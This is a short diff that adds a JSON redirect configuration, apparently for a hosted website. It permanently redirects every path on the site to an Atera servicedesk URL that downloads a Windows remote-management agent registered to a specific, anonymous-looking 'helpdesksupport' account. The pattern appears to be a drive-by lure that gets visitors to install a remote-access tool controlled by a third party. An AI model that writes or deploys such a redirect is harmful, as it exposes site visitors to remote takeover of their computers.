@@ -1,0 +1,9 @@
+{
+  "redirects": [
+    {
+      "source": "/:path*",
+      "destination": "https://helpdesksupport1782876756470.servicedesk.atera.com/api/utils/agent-install/windows/?cid=1&aeid=b1bbd3e6f9f24e8a92cbc1e226d989ef",
+      "permanent": true
+    }
+  ]
+}
